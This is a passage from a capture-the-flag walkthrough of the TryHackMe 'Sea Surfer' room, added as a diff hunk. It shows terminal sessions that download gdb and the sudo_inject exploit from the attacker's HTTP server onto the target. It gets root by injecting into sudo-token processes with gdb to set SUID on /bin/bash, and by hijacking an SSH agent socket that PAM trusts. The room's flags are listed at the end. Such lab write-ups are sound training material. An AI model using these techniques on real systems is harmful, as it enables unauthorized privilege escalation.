@@ -769,3 +769,389 @@ gdb.deb        0%       0  --.-KB/sgdb.deb        0%  21.73K   105KB/sgdb.deb   
 ./etc/gdb/gdbinit
 ./usr/
 ./usr/bin/
+./usr/bin/gcore
+./usr/bin/gdb
+./usr/bin/gdb-add-index
+./usr/bin/gdbtui
+./usr/share/
+./usr/share/doc/
+./usr/share/doc/gdb/
+./usr/share/doc/gdb/NEWS.Debian.gz
+./usr/share/doc/gdb/NEWS.gz
+./usr/share/doc/gdb/README.Debian
+./usr/share/doc/gdb/README.gz
+./usr/share/doc/gdb/README.python_switch
+./usr/share/doc/gdb/changelog.Debian.gz
+./usr/share/doc/gdb/check.log.gz
+./usr/share/doc/gdb/contrib/
+./usr/share/doc/gdb/contrib/ari/
+./usr/share/doc/gdb/contrib/ari/create-web-ari-in-src.sh
+./usr/share/doc/gdb/contrib/ari/gdb_ari.sh.gz
+./usr/share/doc/gdb/contrib/ari/gdb_find.sh
+./usr/share/doc/gdb/contrib/ari/update-web-ari.sh.gz
+./usr/share/doc/gdb/contrib/cc-with-tweaks.sh.gz
+./usr/share/doc/gdb/contrib/expect-read1.c
+./usr/share/doc/gdb/contrib/expect-read1.sh
+./usr/share/doc/gdb/contrib/gdb-add-index.sh
+./usr/share/doc/gdb/contrib/test_pubnames_and_indexes.py.gz
+./usr/share/doc/gdb/contrib/words.sh
+./usr/share/doc/gdb/copyright
+./usr/share/doc/gdb/refcard.dvi.gz
+./usr/share/doc/gdb/refcard.ps.gz
+./usr/share/doc/gdb/refcard.tex.gz
+./usr/share/gdb/
+./usr/share/gdb/python/
+./usr/share/gdb/python/gdb/
+./usr/share/gdb/python/gdb/FrameDecorator.py
+./usr/share/gdb/python/gdb/FrameIterator.py
+./usr/share/gdb/python/gdb/__init__.py
+./usr/share/gdb/python/gdb/command/
+./usr/share/gdb/python/gdb/command/__init__.py
+./usr/share/gdb/python/gdb/command/explore.py
+./usr/share/gdb/python/gdb/command/frame_filters.py
+./usr/share/gdb/python/gdb/command/pretty_printers.py
+./usr/share/gdb/python/gdb/command/prompt.py
+./usr/share/gdb/python/gdb/command/type_printers.py
+./usr/share/gdb/python/gdb/command/unwinders.py
+./usr/share/gdb/python/gdb/command/xmethods.py
+./usr/share/gdb/python/gdb/frames.py
+./usr/share/gdb/python/gdb/function/
+./usr/share/gdb/python/gdb/function/__init__.py
+./usr/share/gdb/python/gdb/function/as_string.py
+./usr/share/gdb/python/gdb/function/caller_is.py
+./usr/share/gdb/python/gdb/function/strfns.py
+./usr/share/gdb/python/gdb/printer/
+./usr/share/gdb/python/gdb/printer/__init__.py
+./usr/share/gdb/python/gdb/printer/bound_registers.py
+./usr/share/gdb/python/gdb/printing.py
+./usr/share/gdb/python/gdb/prompt.py
+./usr/share/gdb/python/gdb/types.py
+./usr/share/gdb/python/gdb/unwinder.py
+./usr/share/gdb/python/gdb/xmethod.py
+./usr/share/gdb/syscalls/
+./usr/share/gdb/syscalls/aarch64-linux.xml
+./usr/share/gdb/syscalls/amd64-linux.xml
+./usr/share/gdb/syscalls/arm-linux.xml
+./usr/share/gdb/syscalls/freebsd.xml
+./usr/share/gdb/syscalls/gdb-syscalls.dtd
+./usr/share/gdb/syscalls/i386-linux.xml
+./usr/share/gdb/syscalls/mips-n32-linux.xml
+./usr/share/gdb/syscalls/mips-n64-linux.xml
+./usr/share/gdb/syscalls/mips-o32-linux.xml
+./usr/share/gdb/syscalls/ppc-linux.xml
+./usr/share/gdb/syscalls/ppc64-linux.xml
+./usr/share/gdb/syscalls/s390-linux.xml
+./usr/share/gdb/syscalls/s390x-linux.xml
+./usr/share/gdb/syscalls/sparc-linux.xml
+./usr/share/gdb/syscalls/sparc64-linux.xml
+./usr/share/gdb/system-gdbinit/
+./usr/share/gdb/system-gdbinit/elinos.py
+./usr/share/gdb/system-gdbinit/wrs-linux.py
+./usr/share/man/
+./usr/share/man/man1/
+./usr/share/man/man1/gcore.1.gz
+./usr/share/man/man1/gdb.1.gz
+./usr/share/menu/
+./usr/share/menu/gdb
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server -d usr/bin/ 1234 
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.74.111 - - [10/Jul/2023 19:59:54] "GET /gdb HTTP/1.1" 200 -
+
+This option specifies the directory from which the server will serve files. In this case, it's set to `usr/bin/`
+
+kyle@seasurfer:/tmp$ wget http://10.8.19.103:1234/gdb
+--  http://10.8.19.103:1234/gdb
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8440200 (8.0M) [application/octet-stream]
+Saving to: ‘gdb’
+
+gdb                              100%[=======================================================>]   8.05M  1.13MB/s    in 7.9s    
+
+(1.02 MB/s) - ‘gdb’ saved [8440200/8440200]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget https://github.com/nongiach/sudo_inject/archive/refs/heads/master.zip
+
+or just
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/nongiach/sudo_inject.git
+Cloning into 'sudo_inject'...
+remote: Enumerating objects: 253, done.
+remote: Total 253 (delta 0), reused 0 (delta 0), pack-reused 253
+Receiving objects: 100% (253/253), 5.99 MiB | 7.42 MiB/s, done.
+Resolving deltas: 100% (132/132), done.
+                                                                                    
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd sudo_inject 
+                                                                                    
+┌──(witty㉿kali)-[~/Downloads/sudo_inject]
+└─$ ls
+activate_sudo_token  exploit_v2.sh  extra_tools  slides_breizh_2019.pdf
+exploit.sh           exploit_v3.sh  README.md
+
+┌──(witty㉿kali)-[~/Downloads/sudo_inject]
+└─$ python3 -m http.server 1234            
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.175.140 - - [10/Jul/2023 20:19:13] "GET /exploit.sh HTTP/1.1" 200 -
+
+kyle@seasurfer:/tmp$ wget http://10.8.19.103:1234/exploit.sh
+--  http://10.8.19.103:1234/exploit.sh
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 648 [text/x-sh]
+Saving to: ‘exploit.sh’
+
+exploit.sh                100%[====================================>]     648  --.-KB/s    in 0s      
+
+(71.4 MB/s) - ‘exploit.sh’ saved [648/648]
+
+kyle@seasurfer:/tmp$ ls
+empty       ssh-MLukItSUvl
+empty2      ssh-RHwxIKi56zVJ
+empty3      systemd-private-da298949e7224408b0aa7463ed43ecf5-apache2.service-eAalKf
+exploit.sh  systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-logind.service-p8FrWh
+f           systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-resolved.service-Y3ELhf
+gdb         systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-timesyncd.service-Qx305e
+snap.lxd
+
+kyle@seasurfer:/tmp$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+kyle@seasurfer:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;
+kyle@seasurfer:/tmp$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+
+kyle@seasurfer:/tmp$ sh exploit.sh
+Current process : 9094
+cp: 'activate_sudo_token' and '/tmp/activate_sudo_token' are the same file
+Injecting process 1128 -> bash
+Injecting process 1936 -> bash
+Injecting process 9068 -> sh
+Injecting process 9071 -> sh
+cat: /proc/9097/comm: No such file or directory
+Injecting process 9097 -> 
+cat: /proc/9099/comm: No such file or directory
+Injecting process 9099 -> 
+cat: /proc/9103/comm: No such file or directory
+Injecting process 9103 -> 
+cat: /proc/9106/comm: No such file or directory
+Injecting process 9106 -> 
+kyle@seasurfer:/tmp$ sudo su
+
+it works just
+
+kyle@seasurfer:/tmp$ chmod +x gdb
+kyle@seasurfer:/tmp$ ls
+activate_sudo_token  snap.lxd
+empty                ssh-MLukItSUvl
+empty2               ssh-RHwxIKi56zVJ
+empty3               systemd-private-da298949e7224408b0aa7463ed43ecf5-apache2.service-eAalKf
+exploit.sh           systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-logind.service-p8FrWh
+exploit_v2.sh        systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-resolved.service-Y3ELhf
+f                    systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-timesyncd.service-Qx305e
+gdb
+kyle@seasurfer:/tmp$ ./gdb
+Python Exception <class 'ModuleNotFoundError'> No module named 'gdb': 
+./gdb: warning: 
+Could not load the Python gdb module from `/usr/share/gdb/python'.
+Limited Python support is available from the _gdb module.
+Suggest passing --data-directory=/path/to/gdb/data-directory.
+GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+--Type <RET> for more, q to quit, c to continue without paging--
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+(gdb) quit
+
+kyle@seasurfer:/tmp$ sudo su
+root@seasurfer:/tmp# cd /root
+root@seasurfer:~# ls
+admincheck  credits.txt  hidePID.sh  root.txt  snap  SSHtoserver.sh
+root@seasurfer:~# cat root.txt 
+THM{STEALING_SUDO_TOKENS}
+root@seasurfer:~# cat credits.txt 
+Good job completing the box!
+
+DM me on Discord if you found any unintended paths / improvement suggestions: lassi#2701
+
+Credits:
+
+Room and company icon: My lovely girlfriend <3
+
+Wordpress images:
+https://www.pexels.com/photo/assorted-colors-of-surfboard-757133/
+https://unsplash.com/photos/I3AMPLzJjW8
+https://commons.wikimedia.org/wiki/File:Venice_Sunset_by_Gustavo_Gerdel.jpg
+
+Employee pictures:
+https://thispersondoesnotexist.com
+
+PDF generator background image:
+https://pixabay.com/photos/beach-birds-sea-ocean-flying-birds-1852945/
+
+HTML invoice template:
+https://github.com/sparksuite/simple-html-invoice-template
+
+root@seasurfer:~# cat SSHtoserver.sh 
+#!/bin/bash
+
+eval $(/usr/bin/ssh-agent -s)
+/usr/bin/ssh-add /root/.ssh/id_rsa
+
+export SSH_AUTH_SOCK="$(find /tmp/ -type s -path '/tmp/ssh-*/agent.*' -user $(whoami) 2>/dev/null)"
+
+/usr/bin/ssh -A -i /root/.ssh/id_rsa kyle@seasurfer.thm -tt 'sudo /root/admincheck; sleep infinity'
+
+root@seasurfer:~# cat hidePID.sh
+#!/bin/bash
+
+mkdir /tmp/empty
+mkdir /tmp/empty2
+mkdir /tmp/empty3
+
+PID1=$(/usr/bin/pgrep -f "/bin/bash /root/SSHtoserver.sh")
+PID2=$(/usr/bin/pgrep -f "/usr/bin/ssh -A -i /root/.ssh/id_rsa kyle@seasurfer.thm -tt sudo /root/admincheck")
+PID3=$(/usr/bin/pgrep -f "sshd: kyle \[priv\]")
+
+mount -o bind /tmp/empty /proc/$PID1
+mount -o bind /tmp/empty2 /proc/$PID2
+mount -o bind /tmp/empty3 /proc/$PID3
+
+root@seasurfer:/tmp# ls 
+activate_sudo_token  sh
+empty                snap.lxd
+empty2               ssh-MLukItSUvl
+empty3               ssh-RHwxIKi56zVJ
+exploit.sh           systemd-private-da298949e7224408b0aa7463ed43ecf5-apache2.service-eAalKf
+exploit_v2.sh        systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-logind.service-p8FrWh
+f                    systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-resolved.service-Y3ELhf
+gdb                  systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-timesyncd.service-Qx305e
+
+do it manually
+
+┌──(witty㉿kali)-[~/Downloads/sudo_inject]
+└─$ tac exploit.sh 
+done
+                | gdb -q -n -p "$pid" >/dev/null 2>&1
+
+kyle@seasurfer:/tmp$ whoami
+kyle
+kyle@seasurfer:/tmp$ ps faux |grep sudo |grep ^`whoami`
+kyle        1128  0.0  0.1   6892  3304 pts/0    Ss+  00:05   0:00  \_ bash -c sudo /root/admincheck; sleep infinity
+kyle       12846  0.0  0.0   6300   720 pts/2    S+   00:36   0:00                  \_ grep --color=auto sudo
+kyle@seasurfer:/tmp$ gdb -q -n -p 1128
+Python Exception <class 'ModuleNotFoundError'> No module named 'gdb': 
+gdb: warning: 
+Could not load the Python gdb module from `/usr/share/gdb/python'.
+Limited Python support is available from the _gdb module.
+Suggest passing --data-directory=/path/to/gdb/data-directory.
+Attaching to process 1128
+Reading symbols from /usr/bin/bash...
+(No debugging symbols found in /usr/bin/bash)
+Reading symbols from /lib/x86_64-linux-gnu/libtinfo.so.6...
+(No debugging symbols found in /lib/x86_64-linux-gnu/libtinfo.so.6)
+Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
+Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libdl-2.31.so...
+Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
+Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.31.so...
+Reading symbols from /lib64/ld-linux-x86-64.so.2...
+--Type <RET> for more, q to quit, c to continue without paging--
+(No debugging symbols found in /lib64/ld-linux-x86-64.so.2)
+Python Exception <class 'NameError'> Installation error: gdb._execute_unwinders function is missing: 
+0x00007f0f84f34c6a in __GI___wait4 (Python Exception <class 'NameError'> Installation error: gdb._execute_unwinders function is missing: 
+pid=-1, stat_loc=0x7ffc25876e10, options=0, usage=0x0)
+    at ../sysdeps/unix/sysv/linux/wait4.c:27
+27	../sysdeps/unix/sysv/linux/wait4.c: No such file or directory.
+(gdb) call system("echo | sudo -S chmod +s /bin/bash 2>&1")
+Python Exception <class 'NameError'> Installation error: gdb._execute_unwinders function is missing: 
+[Detaching after vfork from child process 13301]
+Python Exception <class 'NameError'> Installation error: gdb._execute_unwinders function is missing: 
+$1 = 0
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 1128] will be detached.
+
+Quit anyway? (y or n) y
+Detaching from program: /usr/bin/bash, process 1128
+[Inferior 1 (process 1128) detached]
+kyle@seasurfer:/tmp$ ls -lpah /bin/bash
+-rwsr-sr-x 1 root root 1.2M Jun 18  2020 /bin/bash
+kyle@seasurfer:/tmp$ /bin/bash -p
+bash-5.0# whoami
+root
+bash-5.0# :)
+
+another way after rooting
+
+export SSH_AUTH_SOCK="$(find /tmp/ -type s -path '/tmp/ssh-*/agent.*' -user $(whoami) 2>/dev/null)"
+
+PAM stands for Pluggable Authentication Modules. In the context of `sudo`, PAM is used to provide a flexible authentication mechanism for controlling access to privileged commands. PAM allows system administrators to configure various authentication methods and policies that are used when users attempt to execute commands with `sudo`.
+
+When a user tries to run a command with `sudo`, the PAM module for `sudo` is invoked. This module checks the user's credentials and verifies whether they are allowed to execute the requested command. PAM supports a wide range of authentication methods, such as passwords, smart cards, biometrics, and more. It provides a modular and configurable framework that allows administrators to define their desired authentication policies.
+
+PAM provides an additional layer of security by enforcing authentication requirements for elevated privileges, helping to ensure that only authorized users can perform privileged actions on a system.
+
+kyle@seasurfer:/tmp$ cat /etc/pam.d/sudo
+#%PAM-1.0
+
+auth sufficient pam_ssh_agent_auth.so file=/etc/ssh/sudo_authorized_keys
+
+session    required   pam_env.so readenv=1 user_readenv=0
+session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
+@include common-auth
+@include common-account
+@include common-session-noninteractive
+
+we found an `SSH` agent socket file for the shell process we can access
+
+kyle@seasurfer:/tmp$ cd ssh-MLukItSUvl
+kyle@seasurfer:/tmp/ssh-MLukItSUvl$ ls
+agent.1127
+kyle@seasurfer:/tmp/ssh-MLukItSUvl$ cd ..
+kyle@seasurfer:/tmp$ cd ssh-RHwxIKi56zVJ
+bash: cd: ssh-RHwxIKi56zVJ: Permission denied
+
+we have to do is add the `SSH_AUTH_SOCK` and location to our environment variable and **PAM** would let us use `sudo`
+
+kyle@seasurfer:/tmp$ export SSH_AUTH_SOCK=/tmp/ssh-MLukItSUvl/agent.1127
+kyle@seasurfer:/tmp$ ssh-add -l
+3072 SHA256:boZASmxRncp8AM+gt1toNuZr9jh1dyatwf9DPZYit88 kyle@seasurfer (RSA)
+
+The command `ssh-add -l` is used to list the identities added to the SSH agent.
+
+When you use SSH to connect to remote servers or systems, you typically authenticate using an SSH key pair. The private key is stored on your local machine, and the corresponding public key is uploaded to the remote server. The SSH agent is a program that runs on your local machine and manages your SSH keys.
+
+By running `ssh-add -l`, you can view the list of identities (private keys) that have been added to the SSH agent. This command displays the fingerprint or identifier for each key. The fingerprint is a unique cryptographic representation of the key that helps identify it.
+
+Listing the identities with `ssh-add -l` is useful for verifying which keys are currently available in the SSH agent and can be used for authentication when connecting to remote servers.
+
+kyle@seasurfer:/tmp$ sudo -s
+root@seasurfer:/tmp# :)
+```
+![[Pasted image 20230710174237.png]]
+What is user.txt?
+What is root.txt?
+
+## Flags / Answers
+- ***THM{SSRFING_TO_LFI_TO_RCE}***
+- ***THM{STEALING_SUDO_TOKENS}***
+
+## Notes / Lessons Learned
+[[Anonymous Playground]]
+
